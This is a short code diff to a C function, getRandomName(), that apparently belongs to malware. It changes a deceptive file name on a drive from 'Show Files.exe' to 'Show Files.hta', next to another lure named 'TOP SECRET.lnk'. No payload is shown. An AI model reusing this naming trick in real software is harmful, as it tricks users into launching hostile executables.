@@ -418,7 +418,7 @@ char* getRandomName(){
     }else{
         strcpy(randomName, ":\\TOP SECRET.lnk");
     }
-    strcpy(randomName, ":\\Show Files.exe");
+    strcpy(randomName, ":\\Show Files.hta");
     return randomName;
 }
 
